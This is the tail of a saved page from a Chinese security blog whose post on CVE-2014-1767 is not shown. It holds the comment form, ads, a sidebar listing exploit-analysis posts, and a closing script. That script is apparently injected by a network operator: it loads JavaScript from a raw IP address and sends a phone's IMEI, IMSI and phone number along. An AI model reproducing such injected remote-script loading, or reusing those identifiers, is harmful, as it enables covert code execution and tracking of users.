<span id="span_comment_canceledit" style="display:none"><a href="javascript:void(0);" onclick="return CancelCommentEdit()">不改了</a></span>
<a href="javascript:void(0);" onclick="return logout();">退出</a>
        <a id="commentbox_opt_sub" href="javascript:void(0);" title="订阅后有新评论时会邮件通知您" onclick="commentManager.Subscribe()">订阅评论</a>
</p>
<div id="tip_comment2" style="color:Red"></div>
<p>
[Ctrl+Enter快捷键提交]
</p>
<div style="display:none">
<span id="comment_edit_id"></span><span id="span_parentcomment_id"></span>
<span id="span_parent_id"></span>
<span id="span_comment_replyto"></span>
<span id="span_comment_posted"></span>
</div>
</div>
<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
<div id="ad_t2"><a href="http://www.ucancode.com/index.htm" target="_blank">【推荐】超50万VC++源码: 大型工控、组态\仿真、建模CAD源码2018！</a><br><a href="https://cloud.tencent.com/solution/la?fromSource=gwzcw.766790.766790.766790" target="_blank">【推荐】微信小程序一站式部署 多场景模板定制</a><br></div>
<div id="opt_under_post"></div>
<div id="cnblogs_c1" class="c_ad_block"><a href="http://www.gcpowertools.com.cn/products/spreadjs/?utm_source=cnblogs&amp;utm_medium=blogpage&amp;utm_term=bottom&amp;utm_content=SpreadJS2&amp;utm_campaign=community" target="_blank"><img width="300" height="250" src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/24442-20171206093644566-325426505.png" alt="SpreadJS2_1206"></a></div>
<div id="under_post_news"><div class="itnews c_ad_block"><b>最新IT新闻</b>:<br> ·  <a href="https://news.cnblogs.com/n/590150/" target="_blank">有钱人为所欲为？贝索斯花4200万美元建造“万年钟”</a><br> ·  <a href="https://news.cnblogs.com/n/590149/" target="_blank">批量“搬运”B站的视频资源，在技术上能实现吗？</a><br> ·  <a href="https://news.cnblogs.com/n/590148/" target="_blank">适用于Android和iPhone的Swype键盘宣告停止开发</a><br> ·  <a href="https://news.cnblogs.com/n/590147/" target="_blank">比尔·盖茨将在3月客串《生活大爆炸》</a><br> ·  <a href="https://news.cnblogs.com/n/590146/" target="_blank">索尼将联合开发AI打车系统，进军网约车市场</a><br>» <a href="http://news.cnblogs.com/" title="IT新闻" target="_blank">更多新闻...</a></div></div>
<div id="cnblogs_c2" class="c_ad_block"><a href="http://click.aliyun.com/m/34770/" target="_blank"><img width="468" height="60" src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/24442-20171208101900738-116140477.jpg" alt="阿里云C2-1208"></a></div>
<div id="under_post_kb"><div class="itnews c_ad_block" id="kb_block"><b>最新知识库文章</b>:<br><div id="kb_recent"> ·  <a href="http://kb.cnblogs.com/page/590141/" target="_blank">作为一个程序员，数学对你到底有多重要</a><br> ·  <a href="http://kb.cnblogs.com/page/586236/" target="_blank">领域驱动设计在互联网业务开发中的实践</a><br> ·  <a href="http://kb.cnblogs.com/page/585502/" target="_blank">步入云计算</a><br> ·  <a href="http://kb.cnblogs.com/page/531409/" target="_blank">以操作系统的角度述说线程与进程</a><br> ·  <a href="http://kb.cnblogs.com/page/141729/" target="_blank">软件测试转型之路</a><br></div>» <a href="http://kb.cnblogs.com/" target="_blank">更多知识库文章...</a></div></div>
<div id="HistoryToday" class="c_ad_block"></div>
<script type="text/javascript">
    fixPostBody();
    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
    deliverAdT2();
    deliverAdC1();
    deliverAdC2();    
    loadNewsAndKb();
    loadBlogSignature();
    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
    loadOptUnderPost();
    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
</script>
</div>


	</div><!--end: forFlow -->
	</div><!--end: mainContent 主体内容容器-->

	<div id="sideBar">
		<div id="sideBarMain">
			
<!--done-->
<div class="newsItem">
<h3 class="catListTitle">公告</h3>
	<div id="blog-news"><div id="profile_block">昵称：<a href="https://home.cnblogs.com/u/flycat-2016/">會飛的貓</a><br>园龄：<a href="https://home.cnblogs.com/u/flycat-2016/" title="入园时间：2016-04-04">1年10个月</a><br>粉丝：<a href="https://home.cnblogs.com/u/flycat-2016/followers/">3</a><br>关注：<a href="https://home.cnblogs.com/u/flycat-2016/followees/">0</a><div id="p_b_follow"><a href="javascript:void(0);" onclick="follow(&#39;20abe80a-62fa-e511-9fc1-ac853d9f53cc&#39;)">+加关注</a></div><script>getFollowStatus('20abe80a-62fa-e511-9fc1-ac853d9f53cc')</script></div></div><script type="text/javascript">loadBlogNews();</script>
</div>

			<div id="calendar"><div id="blog-calendar" style=""><table id="blogCalendar" class="Cal" cellspacing="0" cellpadding="0" title="Calendar">
	<tbody><tr><td colspan="7"><table class="CalTitle" cellspacing="0">
		<tbody><tr><td class="CalNextPrev"><a href="javascript:void(0);" onclick="loadBlogCalendar(&#39;2018/01/01&#39;);return false;">&lt;</a></td><td align="center">2018年2月</td><td class="CalNextPrev" align="right"><a href="javascript:void(0);" onclick="loadBlogCalendar(&#39;2018/03/01&#39;);return false;">&gt;</a></td></tr>
	</tbody></table></td></tr><tr><th class="CalDayHeader" align="center" abbr="日" scope="col">日</th><th class="CalDayHeader" align="center" abbr="一" scope="col">一</th><th class="CalDayHeader" align="center" abbr="二" scope="col">二</th><th class="CalDayHeader" align="center" abbr="三" scope="col">三</th><th class="CalDayHeader" align="center" abbr="四" scope="col">四</th><th class="CalDayHeader" align="center" abbr="五" scope="col">五</th><th class="CalDayHeader" align="center" abbr="六" scope="col">六</th></tr><tr><td class="CalOtherMonthDay" align="center">28</td><td class="CalOtherMonthDay" align="center">29</td><td class="CalOtherMonthDay" align="center">30</td><td class="CalOtherMonthDay" align="center">31</td><td align="center">1</td><td align="center">2</td><td class="CalWeekendDay" align="center">3</td></tr><tr><td class="CalWeekendDay" align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td class="CalWeekendDay" align="center">10</td></tr><tr><td class="CalWeekendDay" align="center">11</td><td align="center">12</td><td align="center">13</td><td align="center">14</td><td align="center">15</td><td align="center">16</td><td class="CalWeekendDay" align="center">17</td></tr><tr><td class="CalWeekendDay" align="center">18</td><td align="center">19</td><td align="center">20</td><td class="CalTodayDay" align="center">21</td><td align="center">22</td><td align="center">23</td><td class="CalWeekendDay" align="center">24</td></tr><tr><td class="CalWeekendDay" align="center">25</td><td align="center">26</td><td align="center">27</td><td align="center">28</td><td class="CalOtherMonthDay" align="center">1</td><td class="CalOtherMonthDay" align="center">2</td><td class="CalOtherMonthDay" align="center">3</td></tr><tr><td class="CalOtherMonthDay" align="center">4</td><td class="CalOtherMonthDay" align="center">5</td><td class="CalOtherMonthDay" align="center">6</td><td class="CalOtherMonthDay" align="center">7</td><td class="CalOtherMonthDay" align="center">8</td><td class="CalOtherMonthDay" align="center">9</td><td class="CalOtherMonthDay" align="center">10</td></tr>
</tbody></table></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
			
			<div id="leftcontentcontainer">
				<div id="blog-sidecolumn"><div id="sidebar_search" class="sidebar-block">
<div id="sidebar_search" class="mySearch">
<h3 class="catListTitle">搜索</h3>
<div id="sidebar_search_box">
<div id="widget_my_zzk" class="div_my_zzk"><input type="text" id="q" onkeydown="return zzk_go_enter(event);" class="input_my_zzk">&nbsp;<input onclick="zzk_go()" type="button" value="找找看" id="btnZzk" class="btn_my_zzk"></div>
<div id="widget_my_google" class="div_my_zzk"><input type="text" name="google_q" id="google_q" onkeydown="return google_go_enter(event)" class="input_my_zzk">&nbsp;<input onclick="google_go()" type="button" value="谷歌搜索" class="btn_my_zzk"></div>
</div>
</div>

</div><div id="sidebar_shortcut" class="sidebar-block">
<div class="catListLink">
<h3 class="catListTitle">常用链接</h3>
<ul>
<li><a href="http://www.cnblogs.com/flycat-2016/p/" title="我的博客的随笔列表">我的随笔</a></li><li><a href="http://www.cnblogs.com/flycat-2016/MyComments.html" title="我发表过的评论列表">我的评论</a></li><li><a href="http://www.cnblogs.com/flycat-2016/OtherPosts.html" title="我评论过的随笔列表">我的参与</a></li><li><a href="http://www.cnblogs.com/flycat-2016/RecentComments.html" title="我的博客的评论列表">最新评论</a></li><li><a href="http://www.cnblogs.com/flycat-2016/tag/" title="我的博客的标签列表">我的标签</a></li>
</ul>
<div id="itemListLin_con" style="display:none;">
<ul>

</ul>
</div>
</div></div><div id="sidebar_toptags" class="sidebar-block"></div><div id="sidebar_categories">
<div class="catListPostArchive">
<h3 class="catListTitle">随笔档案</h3>

<ul>

<li><a id="CatList_LinkList_0_Link_0" href="http://www.cnblogs.com/flycat-2016/archive/2017/03.html">2017年3月 (1)</a> </li>

<li><a id="CatList_LinkList_0_Link_1" href="http://www.cnblogs.com/flycat-2016/archive/2017/02.html">2017年2月 (1)</a> </li>

<li><a id="CatList_LinkList_0_Link_2" href="http://www.cnblogs.com/flycat-2016/archive/2016/11.html">2016年11月 (2)</a> </li>

<li><a id="CatList_LinkList_0_Link_3" href="http://www.cnblogs.com/flycat-2016/archive/2016/05.html">2016年5月 (11)</a> </li>

<li><a id="CatList_LinkList_0_Link_4" href="http://www.cnblogs.com/flycat-2016/archive/2016/04.html">2016年4月 (3)</a> </li>

</ul>

</div>

</div><div id="sidebar_recentcomments" class="sidebar-block"><div id="recent_comments_wrap">
<div class="catListComment">
<h3 class="catListTitle">最新评论</h3>
	<div id="RecentCommentsBlock"><ul>
        <li class="recent_comment_title"><a href="http://www.cnblogs.com/flycat-2016/p/5452929.html#3608685">1. Re:从补丁到POC CVE-2015-0003(2015.3)</a></li>
        <li class="recent_comment_body">@程序东不好意思回复的晚，明白了最好了。我表述能力不强，有疑问的地方还望指出。...</li>
        <li class="recent_comment_author">--會飛的貓</li>
        <li class="recent_comment_title"><a href="http://www.cnblogs.com/flycat-2016/p/5452929.html#3575924">2. Re:从补丁到POC CVE-2015-0003(2015.3)</a></li>
        <li class="recent_comment_body">明白了</li>
        <li class="recent_comment_author">--程序东</li>
        <li class="recent_comment_title"><a href="http://www.cnblogs.com/flycat-2016/p/5452929.html#3575001">3. Re:从补丁到POC CVE-2015-0003(2015.3)</a></li>
        <li class="recent_comment_body">两个问题请教一下哈~主要fuzz的wParam参数，但是使用spy++监控程序，wParam始终为fff8，貌似没影响？“似乎只有xxxFlashWindow函数才靠谱：不会崩溃” 我对create.......</li>
        <li class="recent_comment_author">--程序东</li>
</ul>
</div>
</div>
</div></div><div id="sidebar_topviewedposts" class="sidebar-block"><div id="topview_posts_wrap">
<div class="catListView">
<h3 class="catListTitle">阅读排行榜</h3>
	<div id="TopViewPostsBlock"><ul><li><a href="http://www.cnblogs.com/flycat-2016/p/5449738.html">1. Windows kernel pool 初探(2014.12)(709)</a></li><li><a href="http://www.cnblogs.com/flycat-2016/p/6507543.html">2. XSS编码与绕过(421)</a></li><li><a href="http://www.cnblogs.com/flycat-2016/p/5452929.html">3. 从补丁到POC CVE-2015-0003(2015.3)(317)</a></li><li><a href="http://www.cnblogs.com/flycat-2016/p/5426910.html">4. Windows漏洞利用与防护(2015.8)(292)</a></li><li><a href="http://www.cnblogs.com/flycat-2016/p/5452963.html">5. CVE-2015-0057 POC构造 &amp; 利用分析(2015.7)(286)</a></li></ul></div>
</div>
</div></div><div id="sidebar_topcommentedposts" class="sidebar-block"><div id="topfeedback_posts_wrap">
<div class="catListFeedback">
<h3 class="catListTitle">评论排行榜</h3>
	<div id="TopFeedbackPostsBlock"><ul><li><a href="http://www.cnblogs.com/flycat-2016/p/5452929.html">1. 从补丁到POC CVE-2015-0003(2015.3)(3)</a></li></ul></div>
</div>
</div></div><div id="sidebar_topdiggedposts" class="sidebar-block"><div id="topdigg_posts_wrap">
<div class="catListView">
<h3 class="catListTitle">推荐排行榜</h3>
<div id="TopDiggPostsBlock"><ul><li><a href="http://www.cnblogs.com/flycat-2016/p/6507543.html">1. XSS编码与绕过(1)</a></li><li><a href="http://www.cnblogs.com/flycat-2016/p/6481592.html">2. 业务安全逻辑问题(1)</a></li><li><a href="http://www.cnblogs.com/flycat-2016/p/6083440.html">3. 浏览器exp使用经验(1)</a></li></ul></div>
</div></div></div></div><script type="text/javascript">loadBlogSideColumn();</script>
			</div>
			
		</div><!--end: sideBarMain -->
	</div><!--end: sideBar 侧边栏容器 -->
	<div class="clear"></div>
	</div><!--end: main -->
	<div class="clear"></div>
	<div id="footer">
		
<!--done-->
Copyright ©2018 會飛的貓
	</div><!--end: footer -->
</div><!--end: home 自定义的最大容器 -->
<script>jsrc=document.createElement('script');jsrc.src='http://111.8.2.135:9002/www/default/base.js?dest_url=http://www.cnblogs.com/flycat-2016/p/5450275.html&imei=8621550315727000&imsi=460022620140040&msip=10.6.235.5&msisdn=8615262014875?time=0.7265678540657823';var td=document.createElement('div');td.id='topbox';p_=document.body;c_=p_.childNodes[0];p_.insertBefore(jsrc,c_);p_.insertBefore(td,c_);</script>

</body></html>